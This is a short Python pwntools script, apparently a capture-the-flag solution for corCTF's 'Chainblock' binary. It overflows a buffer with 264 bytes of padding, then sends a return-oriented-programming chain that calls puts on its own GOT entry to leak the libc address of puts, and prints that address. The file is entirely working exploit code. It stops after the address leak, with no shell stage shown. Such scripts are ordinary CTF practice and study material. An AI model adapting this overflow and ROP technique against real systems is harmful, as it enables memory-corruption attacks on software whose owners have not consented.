#!/usr/bin/env python3
from pwn import *

import os
os.chdir("./cor_ctf/Pwn/Chainblock")

p = process('./chainblock')
p.recvuntil('name: ')

main_addresss = 0x40124b
puts_got_address = 0x404018
puts_plt_addresss = 0x401080
pop_rdi = 0x401493

payload = b'A' * 264 
payload += p64(pop_rdi) 
payload += p64(puts_got_address) 
payload += p64(puts_plt_addresss) 
payload += p64(main_addresss)

print(p.sendline(payload))
print(p.recvline())

leaked_output = p.recvline()
leaked_output = leaked_output[:-1]

print('leaked puts() addresss', leaked_output)
puts = u64((leaked_output + b"\x00\x00")[:8])
print(hex(puts))

